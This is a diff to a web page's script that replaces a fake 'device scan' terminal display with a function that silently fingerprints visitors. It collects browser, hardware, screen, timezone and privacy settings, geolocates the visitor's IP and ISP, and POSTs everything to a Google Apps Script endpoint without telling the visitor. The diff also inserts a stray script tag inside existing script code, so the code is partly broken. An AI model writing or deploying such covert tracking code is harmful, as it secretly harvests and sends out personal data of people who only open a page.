@@ -59,42 +59,52 @@ const pctTimer=setInterval(()=>{
 },120);
 
 // ===== DATA + TERMINAL =====
-const term=document.getElementById("term");
-const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+<script>
+function getBrowser() {
+  const ua = navigator.userAgent;
+  if (ua.includes("Firefox")) return "Firefox";
+  if (ua.includes("Edg")) return "Edge";
+  if (ua.includes("Chrome")) return "Chrome";
+  if (ua.includes("Safari")) return "Safari";
+  return "Unknown";
+}
 
-async function startScan(){
-  term.textContent="Access granted ✔️\nScanning device...\n";
-  await sleep(800);
-
-  let data={
-    userAgent:navigator.userAgent,
-    language:navigator.language,
-    platform:navigator.platform,
-    screen:screen.width+"x"+screen.height,
-    date:new Date().toLocaleString(),
-    country:"",city:"",ip:""
+async function collectMoreInfo() {
+  let data = {
+    userAgent: navigator.userAgent,
+    browser: getBrowser(),
+    language: navigator.language,
+    languages: navigator.languages?.join(", "),
+    platform: navigator.platform,
+    cpuCores: navigator.hardwareConcurrency || "N/A",
+    memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
+    screen: screen.width + "x" + screen.height,
+    pixelRatio: window.devicePixelRatio,
+    orientation: screen.orientation ? screen.orientation.type : "N/A",
+    darkMode: window.matchMedia("(prefers-color-scheme: dark)").matches,
+    cookiesEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    date: new Date().toLocaleString(),
+    country: "", region: "", city: "", ip: "", isp: ""
   };
 
-  try{
-    const r=await fetch("https://ipapi.co/json/");
-    const j=await r.json();
-    data.country=j.country_name; data.city=j.city; data.ip=j.ip;
-  }catch{}
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const ip = await res.json();
+    data.country = ip.country_name;
+    data.region = ip.region;
+    data.city = ip.city;
+    data.ip = ip.ip;
+    data.isp = ip.org;
+  } catch {}
 
   // ENVOI VERS GOOGLE SHEET
-  fetch("https://script.google.com/macros/s/AKfycbzBoQBLsSn8O8Uvt8I1Ls2bhwIIX9wrX9CuaMCILODprS00lXHqogkInFZJuS-k9Rum/exec",{method:"POST",body:JSON.stringify(data)});
+  fetch("https://script.google.com/macros/s/AKfycbzBoQBLsSn8O8Uvt8I1Ls2bhwIIX9wrX9CuaMCILODprS00lXHqogkInFZJuS-k9Rum/exec", {
+    method: "POST",
+    body: JSON.stringify(data)
+  });
 
-  await sleep(700);
-  term.textContent += "\n===== SCAN RESULT =====\n";
-  term.textContent += "Platform   : "+data.platform+"\n";
-  term.textContent += "Language   : "+data.language+"\n";
-  term.textContent += "Screen     : "+data.screen+"\n";
-  term.textContent += "Country    : "+data.country+"\n";
-  term.textContent += "City       : "+data.city+"\n";
-  term.textContent += "IP         : "+data.ip+"\n";
-  term.textContent += "Date       : "+data.date+"\n\n";
-  term.innerHTML += "Complete <span class='blink'>█</span>";
+  return data;
 }
 </script>
-</body>
-</html>
